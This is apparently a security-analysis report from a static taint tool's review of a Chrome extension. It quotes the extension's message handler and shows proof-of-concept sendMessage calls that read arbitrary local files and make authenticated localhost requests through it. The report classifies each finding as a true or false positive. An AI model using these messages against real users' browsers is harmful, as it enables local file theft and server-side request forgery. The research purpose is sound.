# CoCo Analysis: mkbdkojjljgdiffmfkkgnenbcaelgpho

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (XMLHttpRequest_url_sink, XMLHttpRequest_post_sink, sendResponseExternal_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink (File Access)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mkbdkojjljgdiffmfkkgnenbcaelgpho/opgen_generated_files/bg.js
Line 984: readLockFile(msg.data.path, x => {
Line 1043: xhr.open("GET", 'file:///' + lolRoot + '/lockfile', true);

**Code:**

```javascript
// Background script - External message handler (bg.js Line 967)
function messageHandler(msg, sender, sendResponse) {
    let onFail = innerMsg => { msg.error = innerMsg; sendResponse(msg); };
    let onSuccess = () => sendResponse(msg);

    try {
        if (msg.type == 'ReadLockfileRequest') {
            readLockFile(msg.data.path, x => { // ← attacker-controlled path
                try {
                    msg.data.lockfile = x;
                    onSuccess();
                } catch (ex) {
                    onFail(ex);
                }
            }, onFail);
        } else if (msg.type == 'LcuRequest') {
            lcuRequest(msg.data.lockfile.port, msg.data.lockfile.pw, msg.data.query, x => { // ← attacker-controlled
                try {
                    msg.data.response = x;
                    onSuccess();
                } catch (ex) {
                    onFail(ex);
                }
            }, onFail);
        }
    } catch (ex) {
        onFail(ex);
        return false;
    }
    return true;
}

// Register external message listener (bg.js Line 1013)
function addMessageListener() {
    chrome.runtime.onMessageExternal.removeListener(messageHandler);
    chrome.runtime.onMessageExternal.addListener(messageHandler); // ← External messages accepted
}

chrome.runtime.onInstalled.addListener(addMessageListener);
chrome.runtime.onStartup.addListener(addMessageListener);
addMessageListener();

// File reading function (bg.js Line 1023)
function readLockFile(lolRoot, onSuccess, onFail){
    try {
        let xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            try{
                if (xhr.readyState == 4) {
                    let spl = xhr.responseText.split(":");
                    if (spl.length > 3) {
                        let port = spl[2];
                        let pw = spl[3];
                        onSuccess({port, pw});
                    } else {
                        onFail('LockFileNotFound');
                    }
                }
            } catch (ex) {
                onFail(ex);
            }
        }
        xhr.onerror = onFail;
        xhr.open("GET", 'file:///' + lolRoot + '/lockfile', true); // ← attacker-controlled file path
        xhr.send();
    } catch (ex) {
        onFail(ex);
    }
}

// LCU request function (bg.js Line 1050)
function lcuRequest(port, pw, req, onSuccess, onFail){
    try {
        let xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            try{
                if (xhr.readyState == 4) {
                    let t = xhr.responseText;
                    onSuccess(t);
                }
            } catch (ex) {
                onFail();
            }
        }
        xhr.onerror = x => { onFail('xhr.onerror'); };
        xhr.open("GET", 'https://127.0.0.1:' + port + '/' + req, true); // ← attacker-controlled port and query
        xhr.setRequestHeader("Authorization", "Basic " + btoa("riot:" + pw)); // ← attacker-controlled password
        xhr.send();
    } catch (ex) {
        onFail(ex);
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From https://www.loldodgetool.com/* (whitelisted domain)
// An attacker who controls this domain can execute:

// Attack 1: Read arbitrary local files
chrome.runtime.sendMessage(
    'extension_id',
    {
        type: 'ReadLockfileRequest',
        data: {
            path: 'C:/Users/victim/Documents/sensitive'  // Read any local file
        }
    },
    function(response) {
        console.log('File contents:', response.data.lockfile);
    }
);

// Attack 2: Make privileged requests to localhost with attacker-controlled parameters
chrome.runtime.sendMessage(
    'extension_id',
    {
        type: 'LcuRequest',
        data: {
            lockfile: {
                port: '8080',  // Attacker-controlled port
                pw: 'attacker_pw'  // Attacker-controlled auth
            },
            query: '../admin/secrets'  // Attacker-controlled path
        }
    },
    function(response) {
        console.log('Response:', response.data.response);
    }
);
```

**Impact:** Multiple critical vulnerabilities:
1. **Arbitrary local file read**: Attacker can read any local file accessible to the browser via file:// protocol (extension has "file:///*" permission)
2. **SSRF to localhost**: Attacker can make authenticated requests to https://127.0.0.1 on arbitrary ports with custom paths and credentials
3. **Information disclosure**: File contents and localhost responses are sent back to the attacker via sendResponse

---

## Additional Sinks: XMLHttpRequest_responseText_source → XMLHttpRequest_post_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mkbdkojjljgdiffmfkkgnenbcaelgpho/opgen_generated_files/bg.js
Line 332: XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
Line 1029: let spl = xhr.responseText.split(":");

**Classification:** FALSE POSITIVE (Framework code only)

**Reason:** These detections reference only CoCo's framework mock code (Line 332 is in the framework header before the "// original" marker at Line 963). The actual extension code uses xhr.responseText but this flows from the file:// and localhost responses triggered by the attacker, which are already covered in the TRUE POSITIVE finding above.

---

## Additional Sinks: XMLHttpRequest_responseText_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mkbdkojjljgdiffmfkkgnenbcaelgpho/opgen_generated_files/bg.js
Line 332: XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
Line 1029: let spl = xhr.responseText.split(":");

**Classification:** TRUE POSITIVE (Covered above)

**Reason:** This is the information disclosure component of the main vulnerability. The xhr.responseText from file reads and localhost requests is sent back to the attacker via sendResponse in the messageHandler. This is already documented in the main TRUE POSITIVE finding above.
